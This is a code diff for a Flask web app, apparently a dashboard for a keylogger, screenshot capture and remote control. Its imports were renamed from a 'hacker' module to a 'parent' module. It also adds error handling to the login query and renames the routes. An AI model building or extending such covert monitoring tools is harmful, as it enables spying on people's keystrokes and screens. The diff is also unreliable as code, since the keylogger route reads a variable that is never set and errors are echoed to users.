@@ -1,8 +1,10 @@
 from flask import Flask, request, render_template
 import sqlite3
 import os
-from server.hacker import keylogger
-from server.receiveImageScreen import screenshots
+from server.parent import keylogger as parent_keylogger
+from server.receiveImageScreen import screenshots as parent_screenshots
+
+
 
 app = Flask(__name__)  # Specify the template folder explicitly
 
@@ -18,30 +20,41 @@ def login():
 
         # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
         query = "SELECT * FROM user WHERE username = ? AND password = ?"
-        cursor.execute(query, (username, password))
+        try:
+            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
+            cursor.execute(query, (username, password))
 
-        # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
-        user = cursor.fetchone()
+            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
+            user = cursor.fetchone()
 
-        # Đóng kết nối đến cơ sở dữ liệu
-        conn.close()
+            # Đóng kết nối đến cơ sở dữ liệu
+            conn.close()
 
-        if user:
-            return render_template('index.html')
-            # return "Đăng nhập thành công!"
-        else:
-            return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."
+            if user:
+                return render_template('index.html')
+            else:
+                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."
+        
+        except Exception as e:
+            return "Đã xảy ra lỗi: " + str(e)
+
     return render_template('login.html')
 
 @app.route('/keylogger')
-def keylogger():
-    dataTest= keylogger()
-    return render_template('keylogger.html', dataTest=dataTest)  
+def keylogger_route():
+    # global dataTest
+    # dataTest = parent_keylogger()
+    # return render_template('keylogger.html', dataTest=dataTest)  
+    global keylogger_data  
+    return render_template('keylogger.html', keylogger_data=keylogger_data)
+
 
 @app.route('/screenshots')
-def screenshots():
-    dataTest= screenshots()
-    return render_template('screenshots.html', dataTest=dataTest)  
+def screenshots_route():
+    global dataTest
+    dataTest = parent_screenshots()
+    return render_template('screenshots.html', dataTest=dataTest)
+
 
 @app.route('/remote-control')
 def remoteControl():
